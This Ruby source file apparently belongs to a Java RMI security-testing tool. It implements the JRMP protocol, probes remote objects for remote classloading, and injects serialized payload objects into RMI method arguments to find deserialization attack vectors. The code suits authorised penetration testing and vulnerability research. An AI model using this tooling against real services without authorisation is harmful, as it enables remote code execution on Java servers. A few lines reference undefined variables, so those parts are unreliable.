#!/usr/bin/env ruby

require 'set'
require 'socket'
require 'base64'
require 'timeout'
require 'stringio'
require 'openssl'

require_relative 'deserialize'
require_relative 'serialize'
require_relative 'config'
require_relative 'data'

module Java
  module JRMP
    class JRMPError < StandardError
      attr_accessor :ex
      def initialize(ex)
        @ex = ex
      end
    end

    class InvalidResponseError < StandardError
    end

    def unwrap_exception(r)
      return if r.nil?
      desc = r[0]
      type = desc[0]
      fields = r[1]
      if !fields['cause'].nil? && fields['cause'] != r
        unwrap_exception(fields['cause'])
      end
      return unwrap_exception(fields['detail']) unless fields['detail'].nil?
      r
    end
    module_function :unwrap_exception

    def unwrap_ref(r)
      return if r.nil? || r[1].nil?
      r = r[1]['h'] if r[1].key?('h')
      r[1]
    end
    module_function :unwrap_ref

    class MarshalOutputStream < Java::Serialize::ObjectOutputStream
      def initialize(client, registry, location: nil)
        super(client, registry)
        @annotateClass = true
        @annotateProxyClass = true
        @location = location
      end

      def annotateClass(_cl)
        writeObject(@location)
      end

      def annotateProxyClass(cl)
        annotateClass(cl)
      end
    end

    class JRMPClient
      def initialize(host, port, registry, location: nil, ssl: false)
        @location = location
        @registry = registry
        @ssl = ssl
        if ssl
          sockcl = TCPSocket.new host, port
          sslctx = OpenSSL::SSL::SSLContext.new('SSLv23_client')
          sslctx.verify_mode = OpenSSL::SSL::VERIFY_NONE
          @client = OpenSSL::SSL::SSLSocket.new(sockcl, sslctx)
          @client.connect
        else
          @client = TCPSocket.new host, port
        end
        @client.write('JRMI')
        @client.write([2].pack('S>'))
        @client.write([0x4c].pack('C')) # TransportConstants.SingleOpProtocol
        @client.flush
      end

      def sendLegacy(objId, methodId, methodhash, args, uid: nil)
        @client.write([0x50].pack('C')) # TransportConstants.Call
        oos = MarshalOutputStream.new(@client, @registry, location: @location)

        @client.write([0x77, 34].pack('CC')) # Blockdata
        if !uid.nil?
          @client.write([objId, uid[0], uid[1], uid[2], methodId, methodhash].pack('q>l>q>s>I>Q>'))
        else
          @client.write([objId, 0, 0, 0, methodId, methodhash].pack('q>l>q>s>I>Q>'))
        end

        for arg in args
          begin
            if arg.is_a? Java::Serialize::Data::JavaPrimitive
              bd = ''
              if arg.instance_of? Java::Serialize::Data::JavaBoolean
                bd = [arg.value ? 1 : 0].pack('C')
              elsif arg.instance_of? Java::Serialize::Data::JavaByte
                bd = [arg.value].pack('C')
              elsif arg.instance_of? Java::Serialize::Data::JavaShort
                bd = [arg.value].pack('s>')
              elsif arg.instance_of? Java::Serialize::Data::JavaChar
                bd = [arg.value].pack('S>')
              elsif arg.instance_of? Java::Serialize::Data::JavaInteger
                bd = [arg.value].pack('i>')
              elsif arg.instance_of? Java::Serialize::Data::JavaLong
                bd = [arg.value].pack('q>')
              elsif arg.instance_of? Java::Serialize::Data::JavaFloat
                bd = [arg.value].pack('g>')
              elsif arg.instance_of? Java::Serialize::Data::JavaDouble
                bd = [arg.value].pack('G>')
              else
                raise 'Unimplemented'
              end
              @client.write([0x77, bd.length].pack('CC'))
              @client.write(bd)
            else
              oos.writeObject(arg)
            end
          # server may send error and close connection before consuming all arguments
          rescue Errno::ECONNRESET
            econn = true
            break
          rescue Errno::EPIPE
            econn = true
            break
          end
        end

        @client.flush

        rtype = nil
        Timeout.timeout(10) do
          rtype = @client.read(1).unpack('C')[0]
        end

        raise InvalidResponseError if rtype != 0x51

        smagic, sversion = @client.read(4).unpack('S>S>')
        raise 'Invalid stream magic' if smagic != 0xaced || sversion != 5

        ois = Java::Deserialize::ObjectInputStream.new(@client, @registry)

        bs = ois.read_blockdata
        (resptype, uid1, uid2, uid3) = bs.unpack('CI>Q>S>')

        obj = ois.read_object

        if resptype == 2
          raise JRMPError, obj
        elsif econn
          raise 'Connection error'
        end

        obj
      end
    end

    class JRMPServer
      def initialize(port, registry, bind: true)
        @server = TCPServer.new port if bind
        @registry = registry
    end

      def run
        loop do
          client = @server.accept
          handle_connection(client)
        end
      end

      def handle_stream_proto(client, ois)
        if client.respond_to?('peeraddr')
          sock_domain, remote_port, remote_hostname, remote_ip = client.peeraddr
        else
          remote_port = client.peerport
          remote_hostname = client.peerhost
        end
        client.write([0x4e].pack('C')) # ACK
        client.write([remote_hostname.length].pack('S>'))
        client.write(remote_hostname)
        client.write([remote_port].pack('I>'))
        client.flush

        name = ois.read_utf
        port = client.read(4).unpack('I>')[0]
      end

      def handle_legacy_call(client, ois, objnum, opnum, hash); end

      def handle_call(client, ois)
        smagic, sversion = client.read(4).unpack('S>S>')
        if smagic != 0xaced || sversion != 5
          puts 'Invalid stream magic'
          return
        end

        # read object id
        bdata = ois.read_blockdata
        # read raw objID
        objnum, suinque, stime, scount, opnum = bdata.unpack('Q>I>Q>S>I>')

        if objnum >= 0 && bdata.length == 34 # DGC
          hash = bdata[26, 34].unpack('Q>')[0]
          handle_legacy_call(client, ois, objnum, opnum, hash)
        else
          puts 'Unsupported call ' + onum.to_s(16)
        end

        # RETURN + MAGIC/VERSION
        client.write([0x51, 0xaced, 5].pack('CS>S>'))

        # UID
        client.write([0x77, 15].pack('CS>')) # Blockdata
        client.write([2].pack('C'))
        client.write([0, 0, 0].pack('I>Q>S>'))

        client.write([0x70].pack('C')) # NULL for now, object requires class sannotation
      end

      def handle_request(client, ois)
        op = client.read(1).unpack('C')[0]
        if op == 0x50 # Call
          handle_call(client, ois)
        elsif op == 0x52 # Ping
          client.write([0x53].pack('C')) # ack
        elsif op == 0x54 # DGCAck
        # ignore
        else
          puts 'Unknown operation ' + op.to_s(16)
        end
        client.flush
      end

      def handle_connection(client)
        magic = client.recv(4)
        if magic != 'JRMI'
          puts 'Invalid magic ' + magic.each_byte.map { |byte| format('%02x', byte) }.join
          return
        end

        ver = client.recv(2).unpack('S>')[0]
        if ver != 2
          puts 'Invalid version ' + ver.to_s(16)
          return
        end

        ois = Java::Deserialize::ObjectInputStream.new(client, @registry)
        proto = client.recv(1).unpack('C')[0]
        handle_stream_proto(client, ois) if proto == 0x4b # STREAM

        if proto != 0x4c && proto != 0x4b
          puts 'Invalid protocol'
          return
        end

        handle_request(client, ois)
      ensure
        client.close
      end
    end

    class DGCServer < JRMPServer
      def initialize(port, registry)
        super(port, registry)
        @seen = Set.new
        @handlers = {}
      end

      def handle_dirty(objId)
        if @seen.add?(objId)
          if @handlers.key?(objId)
            h = @handlers[key]
            h(objId)
          else
            puts 'DGC dirty for object ' + objId.to_s
          end
        end
      end

      def handle_legacy_call(_client, ois, objnum, opnum, _hash)
        return if objnum != 2 || opnum != 1
        rv = ois.read_object
        # rv is array of ObjID
        for id in rv
          objId = id[1]['objNum'].unpack('q>')[0]
          handle_dirty(objId)
        end
      end
    end

    class ExceptionJRMPServer < JRMPServer
      def initialize(port, registry, obj, bind: false)
        super(port, registry, bind: bind)
        @seen = Set.new
        @handlers = {}
        @obj = obj
      end

      def handle_call(client, ois)
        smagic, sversion = client.read(4).unpack('S>S>')
        if smagic != 0xaced || sversion != 5
          puts 'Invalid stream magic'
          return
        end

        # read object id
        bdata = ois.read_blockdata
        # read raw objID
        objnum, suinque, stime, scount, opnum = bdata.unpack('Q>I>Q>S>I>')

        oid = [objnum, suinque, stime, scount]

        return if @seen.include?(oid)
        @seen.add(oid)

        # buffer, subtle differences between native and metasploit IO
        out = StringIO.new

        # RETURN + MAGIC/VERSION
        out.write([0x51].pack('C')) # Return
        oos = MarshalOutputStream.new(out, @registry)

        oos.setBlockMode(true)
        oos.writeBytes([2].pack('C')) # ExceptionalReturn
        oos.writeBytes([0, 0, 0].pack('I>Q>S>')) # UID

        oos.writeObject(@obj)
        oos.flush

        client.write out.string
        client.flush
      end
    end

    def make_marshalledobject(obj, reg)
      h = 0
      buf = StringIO.new(''.force_encoding('BINARY'))
      oos = Java::Serialize::ObjectOutputStream.new(buf, reg)
      oos.writeObject(obj)
      oos.flush
      buf.rewind
      bytes = Array(buf.each_byte)
      Java::Serialize::JavaObject.new('Ljava/rmi/MarshalledObject;', 'hash' => h, 'objBytes' => Java::Serialize::JavaArray.new('B', bytes))
    end
    module_function :make_marshalledobject

    def test_remoteclassloading(host, port, reg, objid, uid, methodid, methodhash, ssl: false)
      args = [Java::Serialize::JavaCustomObject.new('Ldoesnotexist;', {}, 'typeString' => 'Ldoesnotexist;')]
      client = Java::JRMP::JRMPClient.new(host, port, reg, location: 'invalid', ssl: ssl)
      client.sendLegacy(objid, methodid, methodhash, args, uid: uid)
      raise 'Should not succeed'
      rescue Java::JRMP::JRMPError => e
        root = unwrap_exception(e.ex)
        type = root[0][0]

        if type == 'java.net.MalformedURLException'
          vuln 'Endpoint appears to allow remote classloading'
          return true
        elsif type == 'java.lang.ClassNotFoundException'
          return false
        else
          raise
        end
      end
    module_function :test_remoteclassloading

    class ReferenceProber
      def initialize(name, ref, reg, connhost, rc: Java::Config::RunConfig.new)
        @name = name
        @reg = reg
        @ref = ref
        @host = ref['host']
        @port = ref['port']
        @objid = ref['objid']
        @uid = ref['uid']
        @ssl = false
        @legacy = false
        @rc = rc

        if !ref['factory'].nil? && ref['factory'][0][0] == 'javax.rmi.ssl.SslRMIClientSocketFactory'
          info 'Exported on a SSL endpoint'
          @ssl = true
        end

        begin
          client = Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
          r = client.sendLegacy(@objid, 0, 0, [], uid: @uid)
          info 'Is a legacy-style object ' + name
          @legacy = true
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]

          if root[1]['detailMessage'] == 'skeleton class not found but required for client version'
            info 'Is a new-style object ' + name
          else
            raise
          end
        rescue Exception => e
          if @host != connhost
            @host = connhost
            info 'Trying with original host ' + @host + ' port ' + @port.to_s
            client = Java::JRMP::JRMPClient.new(@host, @port, @reg, ssl: @ssl)
            begin
              r = client.sendLegacy(@objid, 0, 0, [], uid: @uid)
            rescue Java::JRMP::JRMPError => e
            rescue Exception => e
              error 'Failed to connect: ' + e.to_s
              raise
            end
            end
        end
      end

      def generate_method_hash(sig)
        sha1 = Digest::SHA1.new
        sha1.update [sig.length].pack('s>') + sig.encode(Encoding::UTF_8)
        dgst = sha1.digest
        dgst[0..8].unpack('q<')[0]
      end

      def read_argtype(argsig, p)
        type = ''
        l = 0

        if argsig[p] == 'L'
          s = p
          p += 1 while p < argsig.length && argsig[p] != ';'
          type = argsig[s..p + 1]
          l = p - s + 1
        elsif argsig[p] == '['
          atype, al = read_argtype(argsig[p])
          type = '[' + atype
          l = al + 1
        else
          type = argsig[p]
          l = 1
        end

        [type, l]
      end

      def generate_base_args(sig)
        args = []
        argidx = -1

        s = sig.index('(')
        e = sig.index(')', s + 1)
        argsig = sig[s + 1..e - 1]

        p = 0
        a = 0

        while p < argsig.length
          type, l = read_argtype(argsig, p)

          if argidx < 0 && (type[0] == 'L' || type['0'] == '[')
            argidx = a
            args.push(nil)
          elsif type[0] == 'Z'
            args.push(Java::Serialize::Data::JavaBoolean.new(false))
          elsif type[0] == 'B'
            args.push(Java::Serialize::Data::JavaByte.new(0))
          elsif type[0] == 'S'
            args.push(Java::Serialize::Data::JavaShort.new(0))
          elsif type[0] == 'C'
            args.push(Java::Serialize::Data::JavaChar.new(0))
          elsif type[0] == 'I'
            args.push(Java::Serialize::Data::JavaInteger.new(0))
          elsif type[0] == 'J'
            args.push(Java::Serialize::Data::JavaLong.new(0))
          elsif type[0] == 'F'
            args.push(Java::Serialize::Data::JavaFloat.new(0))
          elsif type[0] == 'D'
            args.push(Java::Serialize::Data::JavaDouble.new(0))
          else
            raise 'Unsupported'
          end

          p += l
          a += 1
        end

        [args, argidx]
      end

      def run
        vectors = []
        if !@rc.methodHash.nil?
          methodhash = @rc.methodHash
          methodid = @rc.methodId
          args = @rc.methodBaseArgs
          argidx = @rc.methodArgIdx
        elsif !@rc.methodSignature.nil?
          methodid = -1
          methodhash = generate_method_hash(@rc.methodSignature)
          args, argidx = generate_base_args(@rc.methodSignature)
          if argidx < 0
            error 'Method without a object-valued parameter'
            return vectors
          end
          info 'Computed method hash ' + methodhash.to_s + ' for ' + @rc.methodSignature
          info 'Injecting argument ' + argidx.to_s
        else
          error 'Further testing requires method details...'
          return vectors
        end

        begin
          send(methodid, methodhash, args)
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.rmi.UnmarshalException'
            error root[1]['detailMessage']
            return vectors
          elsif type == 'java.lang.NullPointerException'
          else
            raise
          end
        end

        return vectors unless @rc.tryDeser?
        ctx = Java::Prober::BuiltinProbes.new.create_context(@reg, params: {
                                                               'methodid' => methodid,
                                                               'methodhash' => methodhash,
                                                               'args' => args,
                                                               'argidx' => argidx
                                                             })
        strategy = Java::Prober::ExceptionProbeStrategy.new(method(:test_call))
        strategy.init(ctx)

        if ctx.run(strategy)
          vectors.push(Java::RMI::RMICallDeserVector.new(@host, @port, @objid, ssl: @ssl,
                                                                               ctx: ctx,
                                                                               uid: @uid,
                                                                               methodId: methodid,
                                                                               methodHash: methodhash,
                                                                               baseargs: args,
                                                                               argidx: argidx))
        end

        vectors
      end

      def send(methodid, methodhash, args, location: nil, customreg: nil)
        reg = @reg
        reg = customreg unless customreg.nil?
        client = Java::JRMP::JRMPClient.new(@host, @port, reg, location: location, ssl: @ssl)
        client.sendLegacy(@objid, methodid, methodhash, args, uid: @uid)
      end

      def test_call(payl, reg, params)
        args = params['args']
        args[params['argidx']] = payl
        send(params['methodid'], params['methodhash'], args, customreg: reg)
        rescue Java::JRMP::JRMPError => e
          root = Java::JRMP.unwrap_exception(e.ex)
          type = root[0][0]
          if type == 'java.lang.IllegalArgumentException'
            return
          else
            return type
          end
        end

      def close; end
    end
  end
end
